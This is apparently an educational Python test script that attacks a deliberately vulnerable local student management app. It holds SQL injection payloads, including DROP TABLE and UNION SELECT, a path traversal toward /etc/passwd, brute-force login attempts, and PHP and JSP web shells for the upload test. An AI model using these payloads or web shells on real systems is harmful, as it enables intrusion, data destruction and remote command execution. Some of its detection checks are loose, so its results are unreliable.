#!/usr/bin/env python3
"""
Test Script for Vulnerable Application
Demonstrates how to exploit vulnerabilities in the Student Management System
FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY
"""

import requests
import sqlite3
import json
from urllib.parse import quote

# Target URL
BASE_URL = "http://localhost:5000"

class VulnerabilityTester:
    def __init__(self, base_url=BASE_URL):
        self.base_url = base_url
        self.session = requests.Session()
        self.vulnerabilities_found = []
    
    def test_sql_injection_login(self):
        """Test SQL Injection in Login Form"""
        print("\n[*] Testing SQL Injection in Login...")
        
        payloads = [
            ("admin' --", "admin123"),
            ("' OR '1'='1", "anything"),
            ("admin' #", "admin"),
        ]
        
        for username, password in payloads:
            try:
                data = {
                    'username': username,
                    'password': password
                }
                response = self.session.post(f"{self.base_url}/login", data=data)
                
                if "Dashboard" in response.text or "Welcome" in response.text:
                    print(f"  [!] SQL Injection Successful!")
                    print(f"      Payload: username='{username}', password='{password}'")
                    self.vulnerabilities_found.append("SQL Injection - Login")
                    return True
            except Exception as e:
                print(f"  [ERROR] {e}")
        
        return False
    
    def test_brute_force_protection(self):
        """Test Brute Force Protection"""
        print("\n[*] Testing Brute Force Protection...")
        
        # Try 10 login attempts quickly
        failed_attempts = 0
        for i in range(10):
            try:
                data = {
                    'username': 'admin',
                    'password': f'wrong_password_{i}'
                }
                response = self.session.post(f"{self.base_url}/login", data=data)
                
                if "Invalid" in response.text or "400" not in str(response.status_code):
                    failed_attempts += 1
                
                if response.status_code == 429:  # Too Many Requests
                    print(f"  [+] Rate limiting detected after {i} attempts")
                    return True
            except Exception as e:
                print(f"  [ERROR] {e}")
        
        if failed_attempts == 10:
            print(f"  [!] No rate limiting detected - {failed_attempts} failed attempts allowed")
            self.vulnerabilities_found.append("Brute Force - No Rate Limiting")
            return False
        
        return True
    
    def test_weak_credentials(self):
        """Test with Weak Default Credentials"""
        print("\n[*] Testing Default Weak Credentials...")
        
        credentials = [
            ("admin", "admin123"),
            ("user", "password"),
        ]
        
        for username, password in credentials:
            try:
                data = {
                    'username': username,
                    'password': password
                }
                response = self.session.post(f"{self.base_url}/login", data=data)
                
                if "Dashboard" in response.text or response.status_code == 200:
                    print(f"  [!] Weak credentials found: {username}:{password}")
                    self.vulnerabilities_found.append("Weak Default Credentials")
                    return True
            except Exception as e:
                print(f"  [ERROR] {e}")
        
        return False
    
    def test_information_disclosure(self):
        """Test Information Disclosure in Login"""
        print("\n[*] Testing Information Disclosure...")
        
        try:
            data = {
                'username': 'nonexistent',
                'password': 'wrongpass'
            }
            response = self.session.post(f"{self.base_url}/login", data=data)
            
            # Check for sensitive information in response
            indicators = [
                "SELECT",      # SQL queries
                "DEBUG",       # Debug messages
                "Traceback",   # Stack traces
                "Database",    # Database info
            ]
            
            for indicator in indicators:
                if indicator in response.text:
                    print(f"  [!] Information Disclosure: Found '{indicator}' in response")
                    self.vulnerabilities_found.append("Information Disclosure")
                    return True
        except Exception as e:
            print(f"  [ERROR] {e}")
        
        return False
    
    def test_session_security(self):
        """Test Session Cookie Security"""
        print("\n[*] Testing Session Cookie Security...")
        
        try:
            # Login first
            data = {
                'username': 'admin',
                'password': 'admin123'
            }
            response = self.session.post(f"{self.base_url}/login", data=data)
            
            # Check cookies
            cookies = self.session.cookies
            
            print(f"  [*] Cookies found: {list(cookies.keys())}")
            
            for cookie_name, cookie_value in cookies.items():
                # Check for security flags
                if 'session' in cookie_name.lower():
                    print(f"  [!] Session Cookie: {cookie_name}")
                    print(f"      Value: {cookie_value}")
                    self.vulnerabilities_found.append("Insecure Session Cookies")
                    return True
        except Exception as e:
            print(f"  [ERROR] {e}")
        
        return False
    
    def test_sql_injection_search(self):
        """Test SQL Injection in Search"""
        print("\n[*] Testing SQL Injection in Search...")
        
        # First, login
        self._login()
        
        payloads = [
            "' OR '1'='1",
            "'; DROP TABLE students; --",
            "' UNION SELECT * FROM users --",
        ]
        
        try:
            for payload in payloads:
                data = {'search': payload}
                response = self.session.post(f"{self.base_url}/search", data=data)
                
                if "Results" in response.text:
                    print(f"  [!] SQL Injection in Search Successful!")
                    print(f"      Payload: {payload}")
                    self.vulnerabilities_found.append("SQL Injection - Search")
                    return True
        except Exception as e:
            print(f"  [ERROR] {e}")
        
        return False
    
    def test_file_upload(self):
        """Test Insecure File Upload"""
        print("\n[*] Testing Insecure File Upload...")
        
        # First, login
        self._login()
        
        # Try uploading dangerous file types
        dangerous_files = [
            ("shell.sh", "#!/bin/bash\necho 'Hacked'"),
            ("malware.exe", "MZ\x90\x00"),  # PE header
            ("webshell.php", "<?php system($_GET['cmd']); ?>"),
            ("payload.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"c\")); %>"),
        ]
        
        try:
            for filename, content in dangerous_files:
                files = {'file': (filename, content)}
                response = self.session.post(f"{self.base_url}/upload", files=files)
                
                if "successfully" in response.text.lower():
                    print(f"  [!] Dangerous file uploaded: {filename}")
                    self.vulnerabilities_found.append("Insecure File Upload")
                    return True
        except Exception as e:
            print(f"  [ERROR] {e}")
        
        return False
    
    def test_path_traversal(self):
        """Test Path Traversal in File Upload"""
        print("\n[*] Testing Path Traversal...")
        
        # First, login
        self._login()
        
        payloads = [
            ("../../../etc/passwd", "password content"),
            ("../../config.py", "import os"),
            ("../../sensitive_file.txt", "secret"),
        ]
        
        try:
            for filename, content in payloads:
                files = {'file': (filename, content)}
                response = self.session.post(f"{self.base_url}/upload", files=files)
                
                if any(segment in response.text for segment in ['../', 'successfully']):
                    print(f"  [!] Path Traversal Possible: {filename}")
                    self.vulnerabilities_found.append("Path Traversal")
                    return True
        except Exception as e:
            print(f"  [ERROR] {e}")
        
        return False
    
    def test_missing_access_control(self):
        """Test Missing Access Control"""
        print("\n[*] Testing Access Control...")
        
        # Login as regular user
        self._login(username='user', password='password')
        
        try:
            # Try accessing admin-only resources
            response = self.session.get(f"{self.base_url}/logs")
            
            if "Logs" in response.text and response.status_code == 200:
                print(f"  [!] Missing Access Control: Regular user can access /logs")
                self.vulnerabilities_found.append("Missing Access Control")
                return True
        except Exception as e:
            print(f"  [ERROR] {e}")
        
        return False
    
    def test_sensitive_data_exposure(self):
        """Test Sensitive Data Exposure"""
        print("\n[*] Testing Sensitive Data Exposure...")
        
        # Login
        self._login()
        
        try:
            response = self.session.get(f"{self.base_url}/students")
            
            # Check for exposed data
            if "SSN" in response.text or "@" in response.text:
                print(f"  [!] Sensitive Data Exposed: SSN visible in student list")
                self.vulnerabilities_found.append("Sensitive Data Exposure")
                return True
        except Exception as e:
            print(f"  [ERROR] {e}")
        
        return False
    
    def _login(self, username='admin', password='admin123'):
        """Helper function to login"""
        try:
            data = {
                'username': username,
                'password': password
            }
            self.session.post(f"{self.base_url}/login", data=data)
        except Exception as e:
            print(f"  [ERROR] Login failed: {e}")
    
    def run_all_tests(self):
        """Run all vulnerability tests"""
        print("=" * 60)
        print("VULNERABILITY ASSESSMENT TEST SUITE")
        print("=" * 60)
        
        self.test_weak_credentials()
        self.test_information_disclosure()
        self.test_sql_injection_login()
        self.test_brute_force_protection()
        self.test_session_security()
        self.test_sql_injection_search()
        self.test_file_upload()
        self.test_path_traversal()
        self.test_missing_access_control()
        self.test_sensitive_data_exposure()
        
        print("\n" + "=" * 60)
        print("VULNERABILITIES FOUND:")
        print("=" * 60)
        
        if self.vulnerabilities_found:
            for i, vuln in enumerate(set(self.vulnerabilities_found), 1):
                print(f"{i}. {vuln}")
        else:
            print("No vulnerabilities found (or application not running)")
        
        print("=" * 60)
        return self.vulnerabilities_found

if __name__ == "__main__":
    tester = VulnerabilityTester()
    tester.run_all_tests()
